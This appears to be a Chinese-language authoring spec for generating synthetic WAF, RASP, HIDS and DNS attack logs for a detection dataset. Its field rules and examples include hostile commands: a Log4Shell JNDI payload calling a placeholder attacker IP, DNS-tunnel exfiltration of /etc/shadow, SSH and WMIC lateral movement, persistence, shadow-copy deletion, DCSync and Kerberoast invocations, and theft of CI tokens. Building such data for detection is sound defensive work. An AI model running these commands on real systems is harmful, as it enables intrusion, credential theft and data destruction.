# 生成数据内容规范（data-1001-1080，80 个 unit）

本文件是**内容作者**（子代理）与**渲染器**之间的契约。作者只产出 JSON 语义片段，
**不写最终数据文件**（时间戳 / log_id / 主机名 / UA / 110 字符截断由渲染器统一处理）。

## 0. 先读语料

动手前先读这两个文件，逐行体会风格（**不是照抄，是模仿格式与信号密度**）：

- `F:/AI_Learning/AgentMemory/dataset/data-921-930.txt`（形态①：waf→web→rasp→hids）
- `F:/AI_Learning/AgentMemory/dataset/data-901-910.txt`（形态②③：含 dns×3、缺 web 行）

## 1. 最终数据文件的形态（渲染器产出，作者不必生成）

```
1. `2026-06-11 04:21:36` **[waf]** `WAF0215684`
    `/stream echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0`
```

- 每条日志 2 行：头部行（序号 + 反引号包裹的时间 + `**[来源]**` + 反引号包裹的 log_id）、
  内容行（4 空格缩进 + 反引号包裹的内容）。unit 之间空一行，unit 内序号从 1 重新起算。
- **内容长度硬上限 110 字符**（不含反引号），超出即从中间腰斩（通常切在 UA 里）。
- **内容里绝不能出现反引号（`）、换行、回车**。
- 来源 5 种：`waf` `web` `rasp` `hids` `dns`。

## 2. 作者要产出的 JSON

```json
{
  "form": "F1",
  "scenarios": [
    {
      "idx": 1,
      "technique": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令）",
      "stack": "spring",
      "host_num": 152,
      "shape": ["waf", "web", "rasp", "hids"],
      "path": "/api/v2/auth/login",
      "carrier": "username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/aWQ=}",
      "rasp_evidence": "{\"jndi\": \"ldap://10.20.7.31:1389/Basic/Command/Base64/aWQ=\", \"lookup\": \"log4j\"}",
      "hids": ["id /usr/bin/id id <== /bin/sh -c 'id' <== java -jar /opt/app/gateway-service.jar"],
      "ua": "windows-chrome",
      "deltas": [0, 1, 2, 58],
      "dns_base": "kpedpm-3d20.net",
      "dns_gap_h": 3.7,
      "dns_steps": [20, 40]
    }
  ]
}
```

字段含义（**除 dns_* 外全部必填**）：

| 字段 | 说明 |
|---|---|
| `idx` | 本 form 内 1..20，唯一 |
| `technique` | 一句话手法名（**本批 80 个 unit 内全局唯一**，作者自己负责唯一性） |
| `stack` | 目标技术栈，取 `node` `php` `nginx` `go` `rails` `java` `tomcat` `django` `spring` 之一（与手法语义一致） |
| `host_num` | 0~210 的整数，决定 RASP 主机名 `app-<stack>-<num>.ops-corp.com`；**同为 `stack` 的不同 unit 编号不要重复** |
| `shape` | 该 unit 的**来源序列**（见 §3），决定行数与顺序 |
| `path` | 请求路径（含 query 时写在 carrier 里更好；形如 `/api/v2/auth/login`、`/index.php`） |
| `carrier` | **载荷片段**（紧跟 path 之后的原始请求片段），这是单元区分度的核心；≤ 80 字符；可含空格/花括号/引号/百分号，**不要含反引号** |
| `rasp_evidence` | RASP 侧看到的 JSON 片段，形如 `{"键": "值", "键2": "值2"}`（键名随手法变化：cmd / cmd_inject / deserialization / mass_assignment / path_traversal / smuggle / jndi / spel / ognl / autoType / template / upload …）；≤ 70 字符 |
| `hids` | 主机侧证据行数组，长度必须 == shape 中 `hids` 出现次数；每条 ≤ 110 字符 |
| `ua` | UA 池键，取 §4 之一 |
| `deltas` | 与 shape **等长**，`deltas[0]` 必须为 0，`deltas[i]` = 第 i 行相对第 i-1 行的秒数差（见 §5） |
| `dns_base` | 仅 shape 含 dns 时必填：C2 域名基线，形如 `kpedpm-3d20.net`（6 个小写字母 + `-` + 4 位 hex + TLD） |
| `dns_gap_h` | 仅含 dns 时必填：hids 末行 → 第一条 dns 的小时差，**0.5 ~ 480 之间**，取 1~2 位小数 |
| `dns_steps` | 仅含 dns 时必填：`[秒, 秒]`，dns 三条之间间隔，各 20~140 |

## 3. 四种形态（shape 必须落在本 form 允许集合内）

| form | 文件 | 允许 shape | 约束 |
|---|---|---|---|
| **F1**（Web 利用链） | `data-1001-1020.txt` | `["waf","web","rasp","hids"]` | 20 个 unit 全部这个形状 |
| **F2**（利用链 + DNS C2/外传） | `data-1021-1040.txt` | `["waf","web","rasp","hids","dns","dns","dns"]` | 必须有 `dns_base`/`dns_gap_h`/`dns_steps`；hids 与 dns 阶段语义要能串成一条链（如命令执行→凭据外传、webshell→C2 心跳） |
| **F3**（无 web 行） | `data-1041-1060.txt` | `["waf","rasp","hids"]`、`["rasp","hids"]`、`["hids"]`、`["waf","hids"]` | 四种形状都要用到（建议分配 6 / 5 / 5 / 4）；**不得出现 `web`**；**不得出现 `dns`** |
| **F4**（双 hids：执行 + 后续动作） | `data-1061-1080.txt` | `["waf","web","rasp","hids","hids"]` | 第 1 条 hids = 利用后的命令执行证据；第 2 条 hids = 提权/持久化/横向/凭据/清理等**后续动作**，两者语义递进不重复 |

## 4. UA 池（作者只给键名）

`windows-chrome` `windows11-edge` `windows-firefox` `mac-safari` `linux-x11-chrome`
`android14-pixel` `ios-iphone` `windows-android13` —— 20 个 unit 里每个键至少用 1 次、同一键最多用 4 次。

## 5. 时间节奏（deltas）硬约束

- 攻击突发段（waf→web→rasp）：**1~2 秒**；`deltas[1]`、`deltas[2]` 取 1 或 2。
- rasp→hids：**58 / 88 / 118 秒**三选一（可 ±3 秒抖动）。
- F4 的 hids→hids：**30~120 秒**。
- F3 只有 `hids` 一条的 unit：`deltas == [0]`。
- F3 的 `["waf","hids"]`：中间隔 **58~118 秒**。
- F2 的 dns 行：`deltas` 里三条 dns 的相对间隔由 `dns_steps` 提供，`deltas[4]`（hids→首条 dns）写 0，
  真实间隔由渲染器按 `dns_gap_h` 换算（因此 **F2 的 `deltas` 长度按含 dns 的 shape 给足 7 个元素，
  dns 三个位置填 `dns_steps` 的两个值 + 0 占位即可**，渲染器以 `dns_gap_h` 为准）。

## 6. 语义与风格要求（最重要）

1. **每行都要像真的传感器日志**：字段、编码、截断残迹都要合理（如 `%%32%65`、`%252e`、
   `rO0ABXNyABFqYXZhLnV0aWw=`、`__HALT_COMPILER();`、`<%@ page ... %>`、`_$$ND_FUNC$$_`）。
2. **跨字段自洽**：path / carrier / rasp_evidence / hids 讲的必须是**同一次攻击**；
   技术栈、父进程、宿主命令要能对上（Node 应用 → 父进程 `/usr/bin/node /opt/app/server.js`；
   PHP → `php-fpm: pool www`；Java → `java -jar …`；Tomcat → `/usr/local/tomcat/bin/catalina.s…`）。
3. **hids 结构照语料的五种家族写**（可换命令/二进制/父进程，但保持形状）：
   - A 命令执行三连：`<cmd> <二进制> <cmd> <== <shell> -c '<cmd>' <== <父进程>`
     例：`cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /opt/app/main`
   - B SSH 横向：`ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.x.y "id; hostname" ssh ssh -i /tmp/.key -o StrictHos…`
   - C Windows 远程执行：`wmic /node:10.20.x.y process call create "cmd.exe /c whoami" cmd.exe cmd.exe /c wmic /node:10.20.x.y proce…`
   - D 域枚举：`net view /domain && net use \\10.20.10.44\C$ cmd.exe cmd.exe /c net view /domain && net use \\10.20.10.44\C$ <…`
   - E/F 持久化：`echo "/tmp/.implant &" >> /etc/rc.local …`、`sed -i "s/exit 0/\/tmp\/.svc -d\nexit 0/" /etc/rc.local …`
   - G DNS 隧道外传：`for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $<8hex>.<域>; done for for line …`
   允许其他真实形态（`schtasks /create`、`sc create`、`reg add …\Run`、`psexec`、`nmap -sT`、
   `docker exec`、`kubectl`、`wevtutil cl`、`xmrig -o` 等），但**同一文件内不要连续 3 个 unit 重复同一形态**。
4. **80 个 unit 之间不得"换皮"**：不允许出现"同一份载荷只改 IP/编号/端口"或
   "同一手法换个路径"。判据：把每行内容里的数字/hex 归一化后，**任意两个 unit 的
   (path+carrier) 与 hids 不得完全相同**；同一 form 内不得出现同一手法。
5. **只用这些地址空间**（真实地址一律不准出现）：
   - 攻击者回连：`10.20.7.31`、`10.20.5.19`、`10.20.5.77`、`203.0.113.x`（文档段）
   - 内网横向目标：`10.20.3.x` / `10.20.4.x` / `10.20.6.x` / `10.20.8.x` / `10.20.10.x`
   - 内网解析答案：`10.10.x.x`；文档段答案：`203.0.113.x` / `192.0.2.x` / `198.51.100.x`
   - 载荷里的探针：`127.0.0.1`、`169.254.169.254`、`metadata.google.internal`
   - 应用主机：`app-<stack>-<num>.ops-corp.com`（渲染器拼）；合成 C2 域名：`<6字母>-<4hex>.net`
6. **反斜杠慎用**：JSON 里 `\` 必须写成 `\\`。写完用 `python -c` 跑 `json.load` 校验并
   `print(repr(...))` 肉眼核对含反斜杠的条目（如 `\\10.20.10.44\C$`）。

## 7. 作者自检（提交前必须做）

```bash
python -c "import json;d=json.load(open(r'F:/AI_Learning/AgentMemory/dataset/gen/formX.json',encoding='utf-8'));print(len(d['scenarios']));[print(s['idx'],len(s['shape']),len(s['hids']),s['technique']) for s in d['scenarios']]"
```

- 20 条、`idx` 1..20 不重复、`len(hids) == shape.count('hids')`、`len(deltas) == len(shape)`（F2 见 §5）、
  `technique` 两两不同、每条 `len(path)+len(carrier) <= 95`、`rasp_evidence` 是**合法的一层 JSON 对象字符串**。
- 返回给主代理的总结：文件路径 + 20 个手法名一行一个（便于去重核对）+ 任何不确定项。


---

# 附：第二批「新攻击家族」批次（unit 1081~1140，2026-07 窗口）

前 80 个 unit（1001~1080）是**已有家族的形态扩展**；本批换**攻击家族**：3 个家族 × 20 个 unit。
除本节另有规定，§1~§7 全部照旧。

## §8.1 家族与编号

| 家族 | 文件 | unit | 主题（每个 unit 必须是该家族内的一个**具体**手法/阶段组合） |
|---|---|---|---|
| **FA 勒索与数据破坏链** | `data-1081-1100.txt` | 1081~1100 | 初始访问→收拢→**破坏恢复能力**（卷影/备份/恢复分区）→**批量加密**→勒索信→横向扩散 |
| **FB 域环境身份攻击链** | `data-1101-1120.txt` | 1101~1120 | 域枚举→Kerberos 滥用（Kerberoast/AS-REP/黄金票据）→DCSync/ntds.dit→域控横向与持久化 |
| **FC 供应链与 CI/CD 投毒链** | `data-1121-1140.txt` | 1121~1140 | 依赖/镜像投毒→构建服务器执行→窃取 CI 密钥→篡改流水线与制品→回连外带 |

## §8.2 形态白名单（本批只能用这些；`shape` 必须逐字一致）

```
["hids"]                                    单条主机侧证据
["hids","hids"]                             两阶段主机动作
["hids","hids","hids"]                      三阶段主机动作
["hids","dns","dns","dns"]                  主机动作 + DNS C2/外传三连
["hids","hids","dns","dns","dns"]           两阶段主机动作 + DNS 三连
["rasp","hids"]                             应用层证据 + 主机落地
["rasp","hids","hids"]                      应用层证据 + 两阶段主机动作
["waf","web","rasp","hids"]                 Web 入口 + 主机落地（FC 用）
["waf","web","rasp","hids","hids"]          Web 入口 + 两阶段主机动作（FC 用）
["waf","web","rasp","hids","dns","dns","dns"] Web 入口 + 主机落地 + DNS 三连（FC 用）
["waf","hids"]                              边缘命中 + 主机落地（FC 用）
```

- **FA/FB 以主机侧为主**：可用 `["hids"]`、`["hids","hids"]`、`["hids","hids","hids"]`、含 dns 的两种、`["rasp","hids"]`、`["rasp","hids","hids"]`。
- **FC 必须有 Web/CI 入口**：至少 12 个 unit 用带 `waf`/`web`/`rasp` 的形状。
- 20 个 unit 里**不要 20 个都用同一种 shape**（每种 shape 至少用一次、且单一 shape 不超过 7 个）。

## §8.3 字段变化（本批特有）

| 情况 | 规则 |
|---|---|
| shape **不含** waf/web/rasp | `path`、`carrier`、`rasp_evidence` 一律填 `""`（空串），`ua` 仍填池键（渲染器不使用） |
| shape **含** rasp | `path`/`rasp_evidence` 必填（同 §2） |
| 需要 3 条以上 hids | `hids` 数组长度必须 == shape 里 `hids` 出现次数（本批可到 3 条） |

## §8.4 时间节奏（本批）

- 相邻**非 dns** 行（含 waf→web→rasp）取 **1~2 秒**（同一 HTTP 请求）或主机阶段间隔 **5~600 秒**（同一台机器上的连续动作）。
- `["hids","hids"]` / `["hids","hids","hids"]` 这类纯主机链：每一步 **5~600 秒**（别用 1 秒，那是同请求特征）。
- 含 dns 时：末条非 dns 行 → 首条 dns 间隔由 `dns_gap_h`（0.5~480 小时）；dns 三条间隔由 `dns_steps`（各 20~140 秒）。
- `deltas` 长度必须 == `len(shape)`，`deltas[0] == 0`；dns 位置照 §5 用 0 占位。

## §8.5 家族特有要求

- **FA**：必须体现「破坏恢复能力」（`vssadmin delete shadows`、`wbadmin delete catalog`、`bcdedit /set recoveryenabled no`、删除备份目录等）与「批量加密」（`openssl enc`、`gpg -c`、`cipher /e`、PowerShell AES 循环、`tar` + `gpg` 等）**两类证据**，一个 unit 至少各出现一次；勒索信只写中性文件名（如 `README_RESTORE.txt`、`!RECOVER!.txt`），**不要出现真实勒索软件品牌名**。
- **FB**：命令要落在真实 ADS/Kerberos 工具链语义上（`nltest /dclist`、`Rubeus kerberoast`、`GetNPUsers.py -request`、`lsadump::dcsync`、`ntdsutil "ac i ntds" "ifm"`、`kerberos::golden /krbtgt:`、`certipy req -ca`、`secretsdump.py -just-dc`）；`hids` 里要能看见 DOMAIN\user 形态（如 `CORP\svc_backup`）。
- **FC**：入口要像 CI/供应链（`npm install` postinstall、`setup.py`、`/api/webhook`、`workflow_dispatch`、`docker build`、`git push`、私服 `index-url`、registry 推送）；窃取的目标是 CI 密钥（`CI_JOB_TOKEN`、`GITHUB_TOKEN`、`AWS_SECRET_ACCESS_KEY`、`.git-credentials`、`id_rsa`）。
- **杀软约束（§7 的 AV denylist 依旧生效）**：不得出现 JS webshell 特征（`require('child_process')` + execSync 连写、JSP 一句话马）；勒索家族不要写真实勒索软件工具名/EICAR 串。
